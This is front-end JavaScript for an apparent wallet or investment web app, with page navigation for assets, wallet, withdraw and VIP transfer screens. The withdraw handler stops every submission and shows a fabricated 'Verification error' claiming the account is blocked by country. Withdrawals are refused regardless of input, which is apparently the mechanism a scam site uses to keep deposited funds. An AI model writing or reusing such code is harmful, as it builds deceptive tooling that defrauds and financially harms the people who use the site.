// Javascript code
const pageTriggers = document.querySelectorAll('.nav-item, .feature-container, .assets-feature, .menu-item, .back-button');
const pageContents = document.querySelectorAll('.page-content');
const navItems = document.querySelectorAll('.bottom-nav .nav-item');

function showPage(pageId) {
    let pageFound = false;
    pageContents.forEach(page => {
        if (page.id === pageId) { page.classList.add('active'); pageFound = true; }
        else { page.classList.remove('active'); }
    });

    if (!pageFound) {
        const homePage = document.getElementById('home-page');
        if (homePage) homePage.classList.add('active');
        console.warn(`Page with ID ${pageId} not found. Showing default page.`);
        pageId = 'home-page';
    }

    let targetPageIsBottomNav = false;
    let keepActiveNav = null;
    navItems.forEach(item => { if (item.getAttribute('data-page') === pageId) targetPageIsBottomNav = true; });

    if (targetPageIsBottomNav) { keepActiveNav = pageId; }
    else {
         if (['assets-page', 'wallet-page', 'account-management-page', 'financial-records-page', 'withdraw-page', 'vip-transfer-page', 'language-settings-page'].includes(pageId)) { keepActiveNav = 'assets-page'; }
         else { keepActiveNav = 'home-page'; }
    }
     navItems.forEach(item => { item.classList.toggle('active', item.getAttribute('data-page') === keepActiveNav); });

    window.scrollTo(0, 0);
    updateHash(pageId);
}

function updateHash(pageId) {
     const currentHash = window.location.hash.substring(2);
     if (currentHash !== pageId) {
         if(history.pushState) { history.pushState({page: pageId}, null, `#/${pageId}`); }
         else { window.location.hash = `#/${pageId}`; }
     }
 }

 window.addEventListener('hashchange', function() {
     const targetPageId = window.location.hash.substring(2) || 'home-page';
     if (document.getElementById(targetPageId)) { showPage(targetPageId); } else { showPage('home-page'); }
 });
  window.addEventListener('popstate', function(event) {
     const targetPageId = event.state ? event.state.page : (window.location.hash.substring(2) || 'home-page');
      if (document.getElementById(targetPageId)) { showPage(targetPageId); } else { showPage('home-page'); }
  });

pageTriggers.forEach(item => {
    item.addEventListener('click', function(e) {
        e.preventDefault();
        const targetPageId = this.getAttribute('data-page');
        if (targetPageId) {
            if (document.getElementById(targetPageId)) { showPage(targetPageId); }
            else { alert(`Placeholder page "${targetPageId}" not found or implemented yet.`); }
        } else { console.warn('Clicked item has no data-page attribute.'); }
    });
});

 document.addEventListener('DOMContentLoaded', () => {
     const initialPage = window.location.hash.substring(2) || 'home-page';
     if (document.getElementById(initialPage)) {
         showPage(initialPage);
         if(history.replaceState) { history.replaceState({page: initialPage}, null, `#/${initialPage}`); }
     } else {
         showPage('home-page');
         if(history.replaceState) { history.replaceState({page: 'home-page'}, null, '#/home-page'); }
     }
 });

// Other scripts
const homePageTabs = document.querySelectorAll('#home-page .tab');
homePageTabs.forEach(tab => { tab.addEventListener('click', function() { homePageTabs.forEach(t => t.classList.remove('active')); this.classList.add('active'); console.log('Home tab clicked:', this.textContent); }); });
const assetsPageSignOutButton = document.querySelector('#assets-page .signout-btn');
if (assetsPageSignOutButton) { assetsPageSignOutButton.addEventListener('click', function() { console.log('Sign out clicked'); alert('Sign out clicked'); }); }

// Withdraw Form Submission - Shows custom error message div
const withdrawForm = document.querySelector('#withdraw-form');
const withdrawErrorDiv = document.getElementById('withdraw-error-message'); // Get the error div

if (withdrawForm && withdrawErrorDiv) {
    withdrawForm.addEventListener('submit', function(e) {
        e.preventDefault(); // Stop form submission

        // Construct the error message with HTML line breaks
        const errorMessage = "<strong>Verification error</strong><br><br>You have visited our site from an unknown country, so your account transaction has been blocked. Our site is officially active only in United Kingdom, United States, United Arab Emirates . If you want to transfer any amount of funds, you must go to activated country and withdraw. Otherwise, the funds will not be able to be withdrawn.";

        // Put the message in the div and show it
        withdrawErrorDiv.innerHTML = errorMessage;
        withdrawErrorDiv.style.display = 'block';

        // Optionally hide the error message after some time
        // setTimeout(() => {
        //     withdrawErrorDiv.style.display = 'none';
        // }, 10000); // Hide after 10 seconds
    });
} else {
    // Check if the elements exist when the page loads
    // console.error("Could not find withdraw form or error display div on initial load.");
}


// VIP Transfer Form Submission (Example)
const vipTransferForm = document.querySelector('#vip-transfer-form');
if (vipTransferForm) { vipTransferForm.addEventListener('submit', function(e) { e.preventDefault(); alert('VIP Transfer submitted (example)!'); showPage('assets-page'); }); }

const captchaPlaceholder = document.querySelector('.captcha-image-placeholder');
if (captchaPlaceholder) { captchaPlaceholder.addEventListener('click', () => { alert('Refresh CAPTCHA (placeholder)'); }); }